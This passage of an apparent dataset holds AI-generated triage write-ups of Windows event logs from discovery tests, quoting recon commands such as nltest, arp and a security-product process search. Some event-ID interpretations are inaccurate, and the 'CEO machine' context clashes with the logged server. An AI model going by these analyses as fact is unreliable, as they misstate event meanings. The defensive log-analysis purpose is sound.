   - There is a heavy presence of EdgeUpdate processes executed by `NT AUTHORITY\SYSTEM`, suggesting automated updates. This is typical but could be leveraged to introduce malicious changes if substituted with a malicious payload.

5. **WMI Host Process Execution:**
   - `C:\Windows\System32\wbem\WmiPrvSE.exe` executed under `NT AUTHORITY\LOCAL SERVICE` may be normal, but repeated instances, especially if coupled with privilege escalations, warrant further analysis.

6. **No Direct Evidence of Malicious Activity:**
   - While some events seem unusual, such as command-line usages and system time changes, there is no direct evidence linking these activities to recognized malicious behaviors definitively. 
   - Activities such as file modification logs, registry tampering, or network connections to known threats are not evidenced here.

### Assessment and Final Resolution:
- **SUSPICIOUS:** The events are abnormal and perform various administrative-level tasks, repeated and close in time, which warrants further investigation to rule out any malicious activity. Particularly, attention should focus on the system clock alterations and the use of elevated privileges to execute potentially sensitive operations.

### Recommendations:
- Perform an integrity check on `MicrosoftEdgeUpdate.exe` and verify its authenticity and hash values against known legitimate versions.
- Investigate the cause and frequency of time changes on the system to rule out or confirm malicious evidence obfuscation.
- Conduct additional endpoint behavior monitoring to see if similar patterns continue or if any new suspicious activities emerge.

In conclusion, while nothing explicitly malicious is confirmed, the behaviors observed require closer inspection to ensure no compromise."
Query Registry,"**Analysis of the Logs:**

1. **WMI Provider Host (WmiPrvSE.exe):** 
   - The process `WmiPrvSE.exe` appears to be executed by `NT AUTHORITY\SYSTEM` which is typical Windows behavior for this service. This is a legitimate Windows process, and there are no suspicious attributes in its execution within the provided logs.

2. **Process Creation Events:**
   - There is a frequent execution of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`. These utility processes by themselves are legitimate, but frequent generalized use like this, especially by a single user, can sometimes indicate efforts to manipulate system event logs.
   - The `conhost.exe` process associated with the execution of various processes can be normal if used in conjunction with utilities like `cmd.exe`, but repetitive execution with no associated commands might warrant a closer look depending on command usage correlatives not provided here.

3. **cmd.exe Process and Extensive Registry Querying:**
   - A `cmd.exe` instance executed a significant bulk of registry queries related to startup and other sensitive areas. This line of queries would typically reflect a script or tool gathering information about the host or attempting to ascertain additional permissions that execute during boot times or user logins.
   - The nature of these queries could be indicative of a diagnostic troubleshooting measure or potentially malicious reconnaissance activity. This deserves further investigation concerning the context of when and why these were executed.

4. **Microsoft Edge Update Execution:**
   - The execution of various Edge update processes appears within the expected normal bounds of a system performing updates. All relevant details such as legitimate command parameters and verified parent processes corroborate this assumption.

5. **Security Log Events:**
   - Event ID 5379 corresponds with `Credential Validation Security Events`. The error code `3221226021` is often associated with failed authentication attempts which are not unusual but should be investigated if they are accompanied by other suspicious activity. Nonetheless, in isolation, it doesn’t immediately suggest malicious intent.

6. **System and Windows Update Client Logs:**
   - The presence of standard Windows update logs offers no cause for concern. The updates are security intelligence updates, indicating standard systematic updates for Microsoft Defender Antivirus.

7. **Suspicious Concerns:**
   - The primary suspicious activity revolves around the frequent registry querying by `cmd.exe` and the heavy and repeated use of `wevtutil.exe` by the admin_test user account to delete or manage event logs, potentially hiding indicators of prior compromise or ongoing malicious operations.

**Assessment:**  
The activity around `cmd.exe` issuing extensive registry queries and `wevtutil.exe` usage is **suspicious** and warrants further investigation, including obtaining more context on the user activity and process history for the `admin_test` account.

**Final Resolution:**  
- **SUSPICIOUS** - The comprehensive registry querying and production system log interactions by an individual non-system process user are incongruous for routine behavior and warrant deeper inspection to confirm or dismiss indicators of compromise.
"
Environment variables discovery on windows,"Based on the provided logs, let's review and assess the events for any indicators of potentially malicious activity:

### System Log:
1. **Kernel-General and Time-Service Events**: These show timestamp creation and synchronization with an NTP server (time.windows.com). These events related to time adjustments appear to be normal operations.

### Security Log:
1. **Event ID 4616**: Two events indicating the time was changed. This could be routine if the time was synced through an NTP server. No direct indications of malicious intent are evident.
2. **Event ID 4634**: This indicates a logoff event for ""admin_test"" with Logon Type 3, typically used for network logons. Without additional suspicious activity, this seems routine.
3. **Event ID 4672**: Indicates special privileges being assigned to ""admin_test"", typically indicative of high system privileges (e.g., debug privileges). This could be legitimate, depending on whether ""admin_test"" is an authorized administrator account.
4. **Event ID 4624**: Successful logon events logged with NTLM authentication. Such logons can be routine, depending on the network setup and user activity.

### Application Log:
1. **Security-SPP Event ID 16384**: Related to the Software Protection Platform Service, which manages licensing and activation. This is routine behavior.

### Sysmon Log:
1. **Processes Executed**: Several instances of ""wevtutil.exe"", ""conhost.exe"", ""whoami.exe"", ""hostname.exe"", and ""cmd.exe"" being executed by ""admin_test"". These tools can be used in legitimate administrative tasks as well as for reconnaissance by an attacker.
2. **Notably, ""cmd.exe"" /c set**: This indicates that environment variables were listed, which can be part of malware activities, but equally part of legitimate administration tasks.
3. **svchost.exe and system utilities as Parent Processes**: These are routine Windows OS processes; however, seeing high-integrity processes like `cmd.exe` executed can be suspicious unless linked to authorized actions.

### Assessment and Resolution:
- **Suspicious Activities**: The use of administrative command-line tools and special privilege logons by ""admin_test"" could be part of regular administrative activities if this user is known to perform such tasks. However, in a security context, these activities may become points of interest when occurring unexpectedly or without documented reasons. The execution of system process manipulation or viewing tools (`whoami.exe`, `hostname.exe`) frequently can be consistent with reconnaissance activities.
- **Absence of Crippling Indicators**: No direct indicators or artifacts (like outbound network connections to unusual IPs or execution of known malware signatures) that irrefutably suggest malicious activities are present.
  
**Guidance and Recommended Actions**:
1. **Review Account Use**: Verify if ""admin_test"" should have been initiating these activities during this time frame. Ensure that this account's actions align with their administrative responsibilities.
2. **User Anomaly/Credential Abuse**: Investigate ""admin_test"" for any signs of unusual activity recently, or unauthorized privilege use.
3. **Audit Privileges and Commands**: Look at any other systems for similar patterns indicating potentially unauthorized administrative behavior.
4. **Monitoring and Alerts**: Set up alerts for repeated or unusual high-integrity command-line interface (CLI) operations and logins to detect any abnormal patterns early.

**Resolution**: **SUSPICIOUS** – The logs exhibit activities that merit further investigation, including frequent usage of administrative commands and privilege escalations which should be correlated with user roles and activities to rule out potential misuse or anomaly."
Enumerate Root Domain linked policies Discovery,"Based on an analysis of the provided logs, we can identify several noteworthy points that may indicate potential security concerns. Here is a detailed assessment:

### **1. Security Log:**
- **Event ID 4616:** This indicates a time change activity on the system. Time changes can sometimes be associated with malicious activity as actors attempt to alter audit logs or deceive logging systems. However, the change here appears legitimate and attributed to the ""LOCAL SERVICE"" account, a common service account, with svchost.exe as the process name. 

### **2. PowerShell Log:**
- **Event ID 600 and 400:** These logs indicate that a PowerShell session was started. The command mentioned performs a search through the Active Directory (using `ADSISearcher` and `ADSI`), outputs domain paths, and potentially GPO links. This action can be associated with reconnaissance activities often utilized by attackers to gather information about the network. This is considered suspicious if not aligned with legitimate administrative tasks.

### **3. Sysmon Log:**
- **Event IDs 1 and 5:** Several sysmon logs indicate the launching of common utilities like `whoami.exe`, `hostname.exe`, and manipulation using `wevtutil.exe` and `conhost.exe`. These are legitimate tools that can, however, be co-opted for malicious activities. The specific processes executed and the fact they are followed by PowerShell execution raise a red flag, suggesting further investigation is warranted.
  
### **4. Application Log and System Log:**
- Most entries in the application and system logs pertain to routine operations like Microsoft Edge updates and time synchronization, which do not typically indicate malicious behavior. 

### **Summary:**
- **Suspicious Behavior:** The PowerShell activity is suspect given its use of directory service queries which is not typical user behavior unless explicitly needed for administrative tasks. Combined with the PowerShell executions linked to reconnaissance activities, and the sysmon entries indicating the use of system utilities, it contributes to a suspicion of potentially aggressive behavior.
- **No direct malicious indicators** such as Exfiltration or severe privilege escalation mechanisms observed directly from these logs.

### **Resolution:**
- **SUSPICIOUS**: Although there's no explicit sign of definitive malicious conduct, the PowerShell activity, combined with the leveraging of native Windows utilities, can suggest potential reconnaissance or preparatory steps for a malicious operation. Further investigation is recommended, including:
  - Checking who executed these commands and verifying their business purpose.
  - Reviewing additional logs and network activity around these timestamps for anomalies or corroborating events.
  - Ensuring that the system's security patches and endpoint protections are up-to-date. 

### **Actionable Steps:**
- Contact the involved system's user and IT administrators to validate the necessity and intent behind these PowerShell commands.
- Increase monitoring of related activities on the CEO's machine for any continuity in suspicious behavior.
- Consider conducting a full threat hunting exercise focusing on PowerShell and native utilities' unusual usage in your environment."
Enumerate Linked Policies In ADSISearcher Discovery,"Upon examining the provided logs, I will analyze for any suspicious activities or indicators that may suggest malicious behavior:

### Security Logs
1. **Event ID 4616** - Demonstrates a change in the system time, which can be indicative of attempts to manipulate logs or timestamps. The process responsible for these changes is `svchost.exe` running as `LOCAL SERVICE`, which is common for system services. There isn't enough context to decisively call this malicious as it might be a routine operation or a misconfiguration. However, if this was intentional for covering tracks, it would be a concern.

### Sysmon Logs
1. **Wevtutil.exe Usage**: Multiple instances of `wevtutil.exe` are executed by `admin_test`. This utility is used for managing event logs. If executed in such a manner, it might indicate attempts to gather logs or clear them. If not used by admin on a routine basis, this could be suspicious.
   
2. **PowerShell Execution**: The command executed via PowerShell attempts to query Active Directory information, specifically organizational units and group policies. While this could be a legitimate administrative task, it is somewhat suspicious as this type of information is usually queried for reconnaissance.
   
3. **Process Ancestry**: Running utilities like `whoami.exe`, `hostname.exe`, and `conhost.exe` in succession after running PowerShell for AD queries could indicate information gathering or enumeration by a potential intruder or malicious script.

4. **Edge Update Execution**: Numerous updates and executions linked to `MicrosoftEdgeUpdate.exe` might appear scripted or automated, generally indicating routine operations. However, having multiple update commands in such a short span could also be a evasion technique, though unlikely given the context.

### PowerShell Logs
1. **PowerShell Execution (Event ID 600)**: This confirms the PowerShell activity seen in Sysmon logs and its command line details. It matches with known examples of PowerShell being used to enumerate AD objects and policies. This type of script could either be an admin list or malicious reconnaissance.

### System Logs
1. **Time Change Events (Event ID 1)**: This is consistent with what is seen in the Security logs, with `svchost.exe` being involved in time changes. 

### Application Logs
- Typical entries relating to service stops, including `edgeupdate`. Stopping services is not uncommon but should be consistent with known system behavior or administrative action.

### Assessment
- **Suspicious Behavior**: We have several rapidly executed events with tools that can be used for enumeration, as well as system time changes. These behaviors are consistent with possible reconnaissance activities or attempts to manipulate logging environments.

### Threat/Risk Assessment
- **Potential Risks**: Possible reconnaissance aimed at obtaining information about the organizational unit and group policies. Time manipulation could be an attempt to hide actions or evade detection.
- **Potential Threats**: If these actions were unauthorized, they could point to an early stage penetration or internal abuse.

### Recommended Actions
1. **Verify Legitimate Use**: Communicate with the user `admin_test` to confirm whether these actions were part of routine administrative tasks.
2. **Security Monitoring**: Increase monitoring for further anomalies on this host, especially around PowerShell and system utility executions.
3. **Review Access and Permissions**: Ensure the accounts involved have only the necessary permissions needed and review any potentially exposed endpoints.
4. **Time Configuration Review**: Investigate reasons for time manipulation and ensure NTP configurations are correctly enforced.

### Resolution
**SUSPICIOUS** - The actions observed are unusual enough to warrant further investigation to rule out malicious activity."
Remote System Discovery - nslookup,"Upon analyzing the provided Windows event logs, several observations and behaviors can be noted:

### Suspicious Behavior:
1. **Continuous Execution of `whoami`, `ipconfig`, `nslookup`:**
   - The logs show repeated use of utilities such as `whoami.exe`, `ipconfig.exe`, and particularly `nslookup.exe`, extensively querying sequential IP addresses within a subnet. This suggests network reconnaissance activity, potentially scanning for live hosts on the network.

2. **PowerShell Script Execution:**
   - A PowerShell command was executed that combines `ipconfig`, with `nslookup`. This is atypical and signifies automated network discovery or mapping, often indicative of a reconnaissance phase in an attack or attempting to enumerate network configurations.

3. **Abuse of Legitimate Tools:**
   - Usage of native Windows binaries like `cmd.exe` with `nslookup` and `powershell.exe` can be a technique used to evade detection, especially when executed with such specific, structured commands leading to sequential IP lookups.

### Unusual Privilege Usage:
- **Security Events for Privilege Use (EventID 4672):**
  - The user `admin_test` obtained several high-level privileges that include `SeDebugPrivilege` and others typically indicative of privilege escalation or preparation for a more in-depth compromise.

### Security Log Observations:
- Multiple logon events (EventID 4624) and privilege escalation events (EventID 4672) were recorded for the `admin_test` account, which suggests either a misconfiguration or possible account abuse if this extensive use is not typical.

### Assessment:
The combination of automated network reconnaissance using PowerShell, along with apparent privilege escalation activities and extensive use of network monitoring commands (`nslookup`), suggests a high potential of malicious activity on the server `Server002`.

### Threats and Risks Identified:
- **Network Reconnaissance:** The repeated querying of IP addresses points towards an attacker attempting to identify network assets or vulnerabilities.
- **Potential Exploitation:** The activity might be a precursor to exploitation based on the reconnaissance results.
- **Compromise Risk:** Elevated privileges observed in the logs could be leveraged to perform unauthorized actions.

### Guidance:
- **Immediate Review of User Activities:** Investigate the source of the elevated privileges and command executions, particularly for the `admin_test` account.
- **Network Traffic Monitoring:** Review network traffic associated with `Server002` for any unusual outbound connections that might indicate data exfiltration or further malicious activity.
- **Credential Compromise Audit:** Conduct a comprehensive review of the user accounts, focusing on identifying any unauthorized access or misuse of privileges.
- **Security Control Enhancements:** Strengthen network and endpoint monitoring to detect and respond to similar patterns of reconnaissance and suspicious PowerShell usage.

### Resolution:
Considering the evidence of reconnaissance activities and suspicious privilege usage, the resolution of this finding is:

- **MALICIOUS**

These observations necessitate immediate action to determine the scope of the potential compromise and mitigate any associated risks to the network and systems."
Security Software Discovery,"**Analysis of the Logs:**

Upon examining the provided event log snippets from the System, Windows PowerShell, Application, Sysmon, and Security logs, several behaviors stand out that warrant further analysis.

1. **Process Execution Logs:**
   - There is an extensive amount of command-line activities initiated by `cmd.exe`, executing multiple PowerShell commands and processes in rapid succession. This includes tasks like checking firewall rules, querying for antivirus processes, and verifying the presence of system monitoring services like Sysmon.
   - The PowerShell logs show execution of commands like ""Get-Process"", ""Get-Service"", and ""Get-CimInstance"", which are generally benign but could indicate reconnaissance activities when used excessively or from unusual accounts or contexts.
   - Notable processes like `whoami.exe`, `tasklist.exe`, and `netsh.exe` being executed in a sequence could indicate attempts to gather system/network information or manipulate firewall configurations.

2. **Sysmon and Security Logs:**
   - Frequent creation of processes with high integrity level which suggests execution in a context with elevated privileges.
   - Several processes run as `NT AUTHORITY\SYSTEM`, indicating potential access to high-privilege accounts, notably through `MicrosoftEdgeUpdate.exe`, which in typical scenarios should not be generating this much noise unless it is updating or a scheduled task.
   - `WmiPrvSE.exe` is running, which is common but can also be used for malicious WMI activities.
   - Processes like `svchost.exe` and `sppsvc.exe`, which are core system processes, show up in logs, indicating activity—common for legitimate operations but could be suspicious if tampered with.

3. **Unusual Patterns:**
   - The use of `FindStr` with antivirus and service-related keywords could be indicative of searching through the process list for cybersecurity detection tools, a common tactic in evasion or malicious reconnaissance.

**Assessment:**
The command-line activity involving security products, combined with the operational context of high integrity level processes, the investigation of system services, and the probing of system configurations, exhibit characteristics that can be associated with malicious intent, or at least with security audits conducted by potentially unauthorized personnel or tools.

- The presence of these activities on the CEO’s machine heightens the potential impact since any compromise could lead to sensitive data exposure or entry points for further attacks.

**Threats/Risks Identified:**
- Potential unauthorized reconnaissance.
- Possible preparation for privilege escalation or persistence.
- Increased risk due to activity involving network and security configurations.

**Guidance on How to Proceed:**
- Conduct a full scan for malware and any unauthorized tools on the CEO’s machine.
- Review who executed these commands (user accounts involved) and validate their activity context.
- Deploy tighter monitoring for any unusual behavior and configure alerts for similar activities in the future.
- Ensure all software, especially security tools, are up to date.
- Verify the integrity of system processes and configurations to ensure no alterations have been made by unauthorized users.

**Resolution: SUSPICIOUS**
The analysis concludes there is suspicious activity needing further investigation. This finding necessitates immediate containment measures and subsequent forensics to determine the extent and cause of the event.
"
System Time Discovery - PowerShell,"Upon careful examination of the provided logs, the following points of interest and potential concerning activities have been identified:

### Application Log:
- The entries in the Application log mostly relate to service stops of ""edgeupdate,"" which appear to be regular operations related to service management for Edge updates and do not imply any immediate signs of compromise.

### Sysmon Log:
- **Process Execution and User Involvement:**
  - **wevtutil.exe** and **conhost.exe** processes, among others, are executed by the user SERVER002\admin_test. While these executables are Windows system binaries, frequent and rapid execution in sequence, especially under an elevated context (admin_test), and absence of corresponding signs indicating legitimate administrative tasks could be suspicious if not usual for this user.

- **Execution of PowerShell:**
  - The execution of **powershell.exe** with a relatively benign command (""Get-Date"") does not inherently signal malicious intent, yet the use of PowerShell in any context on high-value targets (e.g., CEO machine) requires verification of legitimacy due to its powerful capabilities often leveraged in attacks.

- **Hostname and Whoami Execution:**
  - Both **hostname.exe** and **whoami.exe** indicate querying of system and user information. These could be components of information gathering, potentially preceding other actions, which would be irregular if not correlated with an expected administrative task from the user. 

### Security Log:
- TimeChange events (Event ID 4616) denote adjustments by the **LOCAL SERVICE** account, which aren't intrinsically malicious but merit verification to rule out tampering, especially on critical/sensitive machines.

### System Log:
- Kernel-General and Time-Service entries reflect typical system operations, notably time synchronization activities, aligning with entries in the Security log.

### Windows PowerShell Log:
- Multiple startup events for PowerShell providers (e.g., Registry, Alias, FileSystem) indicate initial startups and termination with no reported execution beyond standard initialization indicative of benign activity with the given context.

### Assessment:
- The consistent administrative-level activities and system-level process execution, combined with command invocation patterns, denote potential deviations potentially aligned with misconfiguration or unauthorized activity if not expected in normal operation, especially on a CEO’s system.

### Conclusion:
- **Resolution**: **SUSPICIOUS**
- **Rationale**: While there are no explicit indications of compromise (e.g., creation of suspicious files/directories, DLL injections), the context, particularly with tools like PowerShell and command-line invocations under administrative accounts, necessitates further verification. Crucially, validating the legitimacy of the user activity (admin_test) and confirming whether the observed actions are consistent with normal user or administrative operations can help rule out suspicious activities.

### Guidance:
- Conduct a deeper investigation into the specific operations of the administrative account (SERVER002\admin_test) during this timeframe.
- Increase monitoring of PowerShell and cmd utilities usage, especially under privileged accounts, using enhanced logging or security solutions like Constrained Language Mode or script block logging.
- Validate with IT or relevant stakeholders whether observed activities were expected or sanctioned admin tasks and if not, consider incident response procedures tailored to investigate potential unauthorized access or lateral movement."
Windows Internal pktmon capture,"Upon examining the provided Windows event logs, I have identified patterns and entries that suggest a possible security concern on the server `Server002`. Here’s a detailed analysis:

### Analysis:

1. **Repeated Use of `wevtutil` and `conhost`:**
   - The Sysmon logs reveal multiple executions of `wevtutil.exe` and `conhost.exe` with short intervals between instances. `wevtutil` is typically used for reading and managing event logs, and `conhost.exe` provides console window services.
   - This pattern might be used by an attacker to clear logs or perform log manipulation to cover tracks. However, it's also a legitimate admin activity, so context is crucial.

2. **Execution of Commands with High Integrity Level:**
   - Commands such as `hostname.exe`, `whoami.exe`, and `cmd.exe` (running `pktmon.exe`) were executed with a high integrity level, indicating administrative privileges. 
   - The execution of `pktmon.exe` is particularly suspect, as it is used for monitoring network traffic, which could be indicative of data exfiltration or network reconnaissance activities.

3. **Use of NTLM Authentication:**
   - Security logs show NTLM authentication being used for the `admin_test` account with elevated privileges. This by itself isn’t anomalous, but it happened alongside other suspicious activities.

4. **Privileges Granted to `admin_test`:**
   - The `admin_test` account had several high-level privileges assigned (e.g., SeDebugPrivilege, SeBackupPrivilege) which could be leveraged for privilege escalation or lateral movement within the network.

5. **EdgeUpdate Operations:**
   - The logs mention Microsoft Edge being updated, which is normal in a Windows environment. However, a potential threat actor might use an update process to introduce malicious binaries, though no immediate evidence from logs suggests tampering.

### Conclusion

While there's no absolute evidence of compromise, the combination of high privilege activities by `admin_test`, frequent use of tools that could manipulate logs, and network monitoring tools' execution suggests potentially suspicious behavior. The behaviors don’t conclusively point to malicious activities without further contextual information, such as confirmation whether these actions were part of legitimate administrative tasks.

### Resolution

Based on the analysis above:
- **Resolution: SUSPICIOUS**

### Guidance

1. **Immediate Steps:**
   - Confirm whether the observed activities align with authorized administrative tasks.
   - Review additional logs, such as network logs, application logs, and user login records, to provide more context for these actions.
   - Conduct a security assessment for the `admin_test` account, checking for anomalous logins or unauthorized role changes.

2. **Further Recommendations:**
   - Implement stricter monitoring of privileged accounts, especially for actions like log manipulation or network monitoring.
   - Consider deploying additional security solutions for enhanced real-time alerting on suspicious use of administration and network tools.
   - Educate users and administrators on maintaining security hygiene, emphasizing minimal privilege use and reviewing scheduled tasks for unauthorized changes. 

These steps will help distinguish whether the activities were benign or part of a larger malicious campaign."
Griffon Recon,"Upon reviewing the provided Windows event logs, particularly the PowerShell and Sysmon logs, here is a detailed analysis:

### Analysis:

1. **PowerShell Log Concerns:**
   - The PowerShell logs indicate the execution of a script named `griffon_recon.vbs` from a temporary directory: `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\griffon_recon.vbs`.
   - The command executed is: `powershell.exe & {cscript ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\griffon_recon.vbs""}`.
   - The use of the temp directory for script execution, particularly a script with ""recon"" in its name, is suspicious and often indicative of reconnaissance activities that could be part of an attack chain.

2. **Sysmon Log Concerns:**
   - Sysmon logs confirm the execution of `cscript.exe` (Windows Script Host) to run the `griffon_recon.vbs` script. The user executing this is `SERVER002\\admin_test`.
   - The occurrence of `cscript.exe` along with PowerShell is a pattern commonly used in malware execution or script-based attacks for reconnaissance or lateral movement.
   - Multiple instances of `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe` executions are noted, which could be legitimate if Microsoft Edge is being updated, but in conjunction with other activities could indicate an attempt to disguise malicious activity as legitimate updates.

3. **Other Observations:**
   - Windows processes like `whoami.exe` and `hostname.exe` were executed, which could be normal user commands but may also be used to gather system information for malicious purposes.
   - There is a mix of high-integrity level executions and execution by `NT AUTHORITY\SYSTEM`, which may indicate exploitation for privilege escalation.
  
### Threats or Risks Identified:

- **Potential Reconnaissance and Preparation for Further Attacks:** The execution of `griffon_recon.vbs`, particularly if it is a custom or unknown script, could be part of an attacker's reconnaissance to gather information about the environment before further exploitation.
- **Use of Script Hosts and PowerShell:** This combination is often associated with script-based attacks and exploits, possibly with the intent to evade traditional antivirus mechanisms.

### Guidance on How to Proceed:

1. **Immediate Steps:**
   - Isolate the system (Server002) to prevent any potential spread of malicious activity.
   - Conduct a malware scan, focusing on the script `griffon_recon.vbs` and any related artifacts.
   - Investigate the script content to understand its purpose and any network connections it attempts to establish.

2. **Long-term Actions:**
   - Review system/user access logs to identify how the script was introduced and executed.
   - Implement additional monitoring on the relevant file paths and processes, especially for PowerShell and script host activities.
   - Deploy endpoint detection and response (EDR) solutions to monitor anomalous activities and potential lateral movements.
   - Educate users on the risks of executing or allowing scripts from temporary locations without proper validation.

### Resolution:

Given the identified script execution patterns, potential privilege escalation using `cscript.exe` and PowerShell, and the suspicious nature of the activities observed, the current assessment of the situation is:

**Resolution: SUSPICIOUS**

The activities require further investigation to determine the exact nature and intent, but there's enough to warrant precautionary actions."
Windows - Discover domain trusts with nltest,"### Analysis of Windows Event Logs

#### Suspicious or Anomalous Behavior:
1. **Frequent Command Prompt Executions:**
   - Multiple instances of `cmd.exe` are executed with commands like `WHERE nltest.exe`, `nltest /domain_trusts & nltest /trusted_domains`, and `whoami.exe`. The presence of `nltest.exe` and `whoami.exe` commands is often used in reconnaissance phases of an attack to list domain trusts and identify privilege contexts, respectively.

2. **Use of nltest.exe:**
   - The command `nltest` is used twice to discover domain trusts and trusted domains. This activity could indicate active enumeration within the network, which is typically associated with lateral movement or privilege escalation attempts by a malicious actor.

3. **Use of wevtutil.exe:**
   - Several instances of `wevtutil.exe` are noted. This tool is generally used for querying event logs, but it can also be used to clear logs or perform actions that hide malicious activities. This usage can be concerning if not part of routine maintenance.

4. **Console Window Host (conhost.exe):**
   - Several instances of `conhost.exe` are created as child processes of suspicious command-line executions. This could indicate the launching of a shell or script through the command prompt, which needs to be investigated further.

5. **High Integrity Level Processes:**
   - The integrity level for many suspicious processes is `High`, indicating they were run with elevated privileges or as an administrator, which poses higher risk if these are unauthorized actions.

#### Malicious or Compromise Indicators:
- **No explicit execution of known malware:** The logs do not explicitly show known malware execution. The executables captured (`cmd.exe`, `nltest.exe`, `wevtutil.exe`) are legitimate system binaries often used to carry out administrative tasks or to be utilized in Living off the Land (LotL) attacks.

- **Pattern of enumeration and reconnaissance:** The use pattern of Windows system utilities, such as `nltest.exe`, coupled with attempts to determine the hostname and current user context (`whoami`), suggests possible reconnaissance or network mapping indicative of malicious intentions.

#### Threats or Risks Identified:
- **Potential Internal Reconnaissance:** The combination of commands suggests internal reconnaissance, which may be a precursor to lateral movement.
- **Suspicious Elevation of Privileges:** High integrity level usage without corresponding benign context or justification.

### Recommendation and Resolution
- **Recommendation:** Conduct a thorough investigation to determine the context of these activities. Review user activities on `SERVER002` around the time of these events for any unauthorized access or anomalies. Cross-reference with other logs (e.g., Security logs if available) for any unusual login attempts or privilege escalation activities.

- **Guidance:** If these actions were not sanctioned as part of IT administrative tasks or updates by a trusted party, further investigation should be performed to assess the full scope and impact. Consider network isolation of the affected host if further signs of compromise are discovered.

### Resolution: SUSPICIOUS
The logs indicate activities typical of reconnaissance, and while they may be indicative of system administrative tasks, the context in which they occurred suggests further investigation is required to rule out malicious intent."
Permission Groups Discovery PowerShell (Local),"Based on the logs provided, the following observations and analysis are concluded:

### Security Log Observations:
1. **EventID 4616** - Indicates a change in system time via svchost.exe, which hosts Windows services. This might be routine if there's a legitimate reason for the time change.
2. **EventID 4634** - A logon session by `admin_test` which belongs to a domain administrator. Logon type 3 indicates a network logon, typically related to network resource access.
3. **EventID 4672** - Indicates special privileges that a user with administrative rights (admin_test) was granted. This suggests that `admin_test` is a powerful account with extensive privileges.
4. **EventID 4799** - Changes involving group memberships via PowerShell executed by `admin_test`, which could be legitimate administrative actions but require justification and context.

### Sysmon Log Observations:
1. **Process Execution** - Several executions of wevtutil.exe, which is a command-line utility to manage Windows event logs, were performed by `admin_test`. The use of such utilities should be verified to ensure it's authorized activity.
2. **PowerShell and Command Prompt Activities** - There are logged activities involving PowerShell and console host processes, indicative of script or command execution. Specifically, querying for local group memberships is noted, which is not inherently malicious but scrutinizing its purpose is essential.
3. **Microsoft Edge Updates** - Multiple legitimate processes related to updating Microsoft Edge are observed, indicating routine software maintenance.

### Application and System Logs:
- **Microsoft Edge Logs** - Indicate the stopping of Edge update services, consistent with the transitions observed in the Sysmon log for updating software.
- **System Logs** - Time adjustments are noted, though there is no immediate indication that these adjustments were unauthorized or malicious.

### PowerShell Logs:
- PowerShell activity regarding querying local group membership raises a flag, especially in a sensitive context like a CEO's machine. Context is crucial here, such as determining if this activity was part of regular administration or something more suspicious.

### Assessment:
- **Suspicious** - The activities around PowerShell usage, group modification, and wevtutil.exe execution are the most concerning elements. The context of these activities is not inherently malicious but warrants further investigation to rule out any compromise or misuse, especially on a high-profile machine such as the CEO's.
- Given that `admin_test` has significant privileges, it is critical to ensure these actions are valid and authorized by logging such tasks via secured channels or verifying them with IT management directly.

### Recommendation:
1. **Further Investigation**: Confirm the intent and authorization for using PowerShell to query group membership and for changes made by `admin_test`.
2. **Review Procedures**: Verify administrative activities with the IT team and ensure proper logging and approvals for such actions.
3. **Enhanced Monitoring**: Increase monitoring on high-profile users and sensitive systems to detect anomalous administrative activities promptly.

"
Remote System Discovery - arp,"### Analysis of Windows Event Logs:

After reviewing the provided logs from the Sysmon, System, and Security event logs, a few key observations are made:

1. **Sysmon Logs:**
   - **Frequent Execution of `wevtutil.exe` and `conhost.exe` by `SERVER002\admin_test`:**
     - `wevtutil.exe` and `conhost.exe` are observed running multiple times within a very short duration. While these are legitimate Windows processes, the pattern of execution is notable and might be indicative of a script or automated process possibly being executed by a user with the account `SERVER002\admin_test`.

   - **Usage of WMI and Command Execution:**
     - `wsmprovhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, and `cmd.exe` with arguments (`arp -a`) are seen operating under the `admin_test` account. These are common utilities used in various normal and administrative tasks but could also be exploited for reconnaissance and lateral movement if used suspiciously.
     - The presence of `cmd.exe` running with `arp -a` is particularly interesting as it could be used for network discovery activities.

   - **Windows Update and Edge Update Processes:**
     - Activities related to updating Microsoft Edge (`MicrosoftEdge_X64_*`) and Windows Update (`wuauclt.exe`) appear typical of regular update processes. These processes are running as `NT AUTHORITY\SYSTEM` with system integrity levels which is normal.

2. **System Logs:**
   - **Time Change Observed:**
     - There is a kernel-level time change where the system time is reset in a short span. While potentially benign or due to daylight saving changes, time changes should be verified to ensure they are not being manipulated maliciously.

3. **Security Logs:**
   - **Login and Privilege Elevation Events:**
     - Logs display typical logon events (`4624`) with NTLM authentication for the `admin_test` account. Privilege elevation is noted in event `4672` indicating that the user `admin_test` has special privileges like `SeDebugPrivilege`, which could allow for potentially dangerous system operations.
   - **Credential Validation Failures:**
     - There are multiple failed attempts to retrieve credentials with event ID `5379`, which might suggest attempts at unauthorized access or account enumeration. The failed return code points to unsuccessful credential operations which could indicate malicious attempts to access or enumerate accounts.

### Assessment:

The logs present some instances that could be considered unusual but are not explicitly malicious. Specifically:
- The execution pattern of system utilities like `wevtutil.exe`, `cmd.exe` with `arp -a`, and manipulation or interaction with system processes, combined with attempts at retrieving credentials are activities warranting further review.
- The recurrence of processes and elevated privilege actions warrant a tail alert assessment for post-incident monitoring and potential malicious intent.

### Resolution:

- **SUSPICIOUS.**

### Recommendations:

1. **Further Investigation:**
   - Investigate why `wevtutil.exe` and `conhost.exe` processes were executed frequently, especially under the `admin_test` account. Determine if these were intentional administrative actions.
   - Investigate the purpose and context behind the execution of network discovery commands like `arp -a` by the `admin_test` user.

2. **Credential Access Monitoring:**
   - Monitor systems for any additional attempts to access credentials or failures associated with different accounts.

3. **User Activity Audit:**
   - Conduct an audit of actions taken by the `admin_test` account during the time of interest to ascertain if these activities align with expected administrative behavior.

4. **Time Manipulation Verification:**
   - Confirm if the timestamp changes are justifiable by administrative tasks or environmental configurations like daylight saving.

5. **Strengthen Monitoring Controls:**
   - Improve logging and alerts for process activities, especially concerning sensitive accounts and privilege escalations."
Security Software Discovery - powershell,"Here's a detailed analysis of the provided Windows event logs:

### Analysis

1. **PowerShell Logs:**
   - Multiple entries show something noteworthy. The use of PowerShell to list active processes searching for descriptions containing keywords such as ""virus"", ""carbonblack"", ""defender"", ""cylance"", and any process names containing ""mc"" or named ""Sysmon"".
